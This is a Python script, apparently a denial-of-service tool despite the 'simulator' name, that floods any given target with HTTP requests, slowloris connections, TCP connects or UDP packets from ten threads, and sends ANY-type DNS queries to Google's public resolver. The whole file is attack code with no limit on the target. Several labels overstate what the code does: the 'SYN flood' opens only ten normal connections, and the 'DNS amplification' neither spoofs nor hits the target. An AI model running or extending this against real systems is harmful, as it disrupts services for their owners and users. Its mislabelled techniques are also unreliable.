#!/usr/bin/env python3
import argparse
import requests
import threading
import time
import random
import socket
import logging
from concurrent.futures import ThreadPoolExecutor
import sys

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
logger = logging.getLogger(__name__)

class EnhancedDDoSSimulator:
    def __init__(self, target, rps, duration, attack_type):
        self.target = target
        self.rps = rps
        self.duration = duration
        self.attack_type = attack_type
        self.delay = 1.0 / rps
        self.stop_event = threading.Event()
        
        attack_patterns = {
            'http_flood': self.http_flood,
            'slowloris': self.slowloris,
            'syn_flood': self.syn_flood,
            'udp_flood': self.udp_flood,
            'dns_amplification': self.dns_amplification,
            'mixed': self.mixed_attack
        }
        self.attack_func = attack_patterns.get(attack_type, self.http_flood)
        
    def http_flood(self):
        """HTTP Flood - rapid GET/POST requests"""
        headers = {'User-Agent': 'Mozilla/5.0 (compatible; DDoS-Sim/1.0)'}
        session = requests.Session()
        while not self.stop_event.is_set():
            try:
                response = session.get(self.target, headers=headers, timeout=1)
                logger.info(f"HTTP Flood: {response.status_code}")
            except:
                pass
            time.sleep(self.delay)
    
    def slowloris(self):
        """Slowloris - keep connections open with partial requests"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((self.target.split('//')[1].split('/')[0], 80))
        sock.send(b"GET / HTTP/1.1\r\nHost: " + self.target.encode() + b"\r\n")
        while not self.stop_event.is_set():
            sock.send(b"X-a: " + str(random.randint(1, 5000)).encode() + b"\r\n")
            time.sleep(5)
    
    def syn_flood(self):
        """SYN Flood simulation"""
        target_host = self.target.split('//')[1].split('/')[0]
        for _ in range(10):
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((target_host, 80))
            sock.close()
    
    def udp_flood(self):
        """UDP Flood simulation"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        message = b"DDoS-Simulation-UDP"
        target_host = self.target.split('//')[1].split('/')[0]
        while not self.stop_event.is_set():
            sock.sendto(message, (target_host, 53))
            time.sleep(self.delay)
    
    def dns_amplification(self):
        """DNS Amplification simulation"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        dns_query = b"\x00\x01\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x07example\x03com\x00\x00\xff\x00\x01"
        target_host = "8.8.8.8"  # Google DNS
        while not self.stop_event.is_set():
            sock.sendto(dns_query, (target_host, 53))
            time.sleep(self.delay)
    
    def mixed_attack(self):
        """Mixed attack pattern"""
        attacks = [self.http_flood, self.slowloris, self.syn_flood]
        attack = random.choice(attacks)
        attack()
    
    def run_attack(self, worker_id):
        """Worker thread for attack"""
        logger.info(f"Worker {worker_id} starting {self.attack_type}")
        self.attack_func()
    
    def start(self):
        """Start the attack simulation"""
        logger.info(f"🚀 Starting {self.attack_type.upper()} attack:")
        logger.info(f"   Target: {self.target}")
        logger.info(f"   RPS: {self.rps}")
        logger.info(f"   Duration: {self.duration}s")
        logger.info(f"   Workers: 10")
        
        start_time = time.time()
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(self.run_attack, i) for i in range(10)]
            
            try:
                while time.time() - start_time < self.duration:
                    time.sleep(1)
            except KeyboardInterrupt:
                pass
            finally:
                self.stop_event.set()
                for future in futures:
                    future.cancel()
        
        elapsed = time.time() - start_time
        total_requests = int(elapsed * self.rps * 10)
        logger.info(f"\n✅ Attack completed!")
        logger.info(f"   Duration: {elapsed:.1f}s")
        logger.info(f"   Estimated requests: {total_requests:,}")
        logger.info(f"   Average RPS: {total_requests/elapsed:.0f}")

def main():
    parser = argparse.ArgumentParser(description='Enhanced DDoS Simulator')
    parser.add_argument('--target', required=True, help='Target URL')
    parser.add_argument('--attack', default='http_flood', 
                       choices=['http_flood', 'slowloris', 'syn_flood', 
                               'udp_flood', 'dns_amplification', 'mixed'],
                       help='Attack type')
    parser.add_argument('--rps', type=int, default=100, help='Requests per second')
    parser.add_argument('--duration', type=int, default=60, help='Duration in seconds')
    
    args = parser.parse_args()
    
    simulator = EnhancedDDoSSimulator(args.target, args.rps, args.duration, args.attack)
    simulator.start()

if __name__ == "__main__":
    main()
